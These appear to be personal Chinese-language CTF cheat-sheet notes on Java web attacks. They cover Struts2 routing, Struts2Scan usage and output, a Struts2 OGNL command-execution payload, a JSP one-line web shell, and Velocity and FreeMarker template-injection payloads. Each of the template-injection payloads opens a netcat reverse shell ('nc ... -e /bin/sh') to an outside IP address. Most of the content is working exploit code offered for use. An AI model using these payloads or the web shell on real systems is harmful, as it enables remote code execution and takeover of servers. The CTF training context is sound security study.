##### Struts2

在 Struts2 框架中，URL 通常会映射到一个特定的 action。在你给出的例子中，`index.action` 就是一个 action 的名称。

Struts2 使用一种叫做 "Action-Based" 的模式来处理 HTTP 请求。每个 HTTP 请求都会被映射到一个 action，这个 action 是一个 Java 类，它包含了处理这个请求所需要的业务逻辑。Struts2 会根据配置文件（通常是 struts.xml 文件）中的映射规则，将一个 URL 映射到一个特定的 action。

在你的例子中，`http://192.168.100.8:8080/index.action` 这个 URL 会被 Struts2 映射到一个名为 "index" 的 action。当用户访问这个 URL 时，Struts2 会执行 "index" action 中的代码，处理这个请求，并生成一个响应返回给用户。

所以，`index.action` 是 Struts2 中的一个 action，它是处理用户请求的业务逻辑的地方。具体的业务逻辑会根据你的应用的需求来编写。

模版漏洞

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

###### Struts2-Scan

文件位置：`/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Web/Java渗透/Struts2Scan`

用法：先检测漏洞类型，再利用漏洞（共两步）

####### [单个URL漏洞检测:](https://github.com/Vancomycin-g/Struts2Scan#单个url漏洞检测)

```
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

[+] 正在扫描URL:http://192.168.100.8:8080/index.action
[*] ----------------results------------------
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-046
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-016
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-045
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-015
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-009
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-012
```

####### [批量漏洞检测:](https://github.com/Vancomycin-g/Struts2Scan#批量漏洞检测)

```
$ python3 Struts2Scan.py -f urls.txt
```

####### [POST数据:](https://github.com/Vancomycin-g/Struts2Scan#post数据)

```
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp}
```

####### [指定漏洞名称利用:](https://github.com/Vancomycin-g/Struts2Scan#指定漏洞名称利用)

```
# 命令执行
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec
```

##### JSP 模板注入

###### JSP 一句话木马(tomcat)

```jsp
<%
        if("cmd".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

然后访问 `1.jsp`，GET 参数如下即可利用

```
?pwd=cmd&i=ls
```

如 (Java 中貌似不支持 `cat /f*`)

```
?pwd=cmd&i=cat /flag
```

##### Velocity 模板注入

- 注入的时候记得 urlencode

###### poc 举例

`/ssti` 是 Web 路径，`template` 是 GET 参数，根据具体的题目不同更改。如，原题目的代码是

```java
package BOOT-INF.classes.com.drunkbaby.ssti2.controller;

import java.io.StringWriter;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.apache.velocity.context.Context;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class VelocitySSTI {
  @GetMapping({"/ssti"})
  public void velocity(String template) {
    Velocity.init();
    VelocityContext context = new VelocityContext();
    context.put("author", "Elliot A.");
    context.put("address", "217 E Broadway");
    context.put("phone", "555-1337");
    StringWriter swOut = new StringWriter();
    Velocity.evaluate((Context)context, swOut, "test", template);
  }
}
```

答案：

```bash
/ssti?template=#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nc 144.34.181.239 10008 -e /bin/sh")
```

##### freemaker 模板注入

- 注入的时候记得 urlencode

###### poc 举例

`/hello` 是 Web 路径，`name` 是 GET 参数，根据具体的题目不同更改。如，原题目的代码是

```java
package BOOT-INF.classes.com.drunkbaby.ssti.controller;

import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;
import java.io.IOException;
import java.io.StringWriter;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class FreeMarkerSSTI {
  @GetMapping({"/"})
  public String index() {
    return "visit <a href='/hello?name=1'>it</a>";
  }
  
  @GetMapping({"/hello"})
  public String hello(@RequestParam(value = "name", required = false, defaultValue = "Drunkbaby") String name) throws TemplateException, IOException {
    Configuration configuration = new Configuration();
    String templateContent = "hello: " + name;
    Template tpl = new Template(null, templateContent, configuration);
    StringWriter writer = new StringWriter();
    tpl.process(null, writer);
    System.out.println(writer);
    return writer.toString();
  }
}
```

答案:

```bash
/hello?name=<#assign value="freemarker.template.utility.Execute"?new()>${value("nc 144.34.181.239 10008 -e /bin/sh")}
```
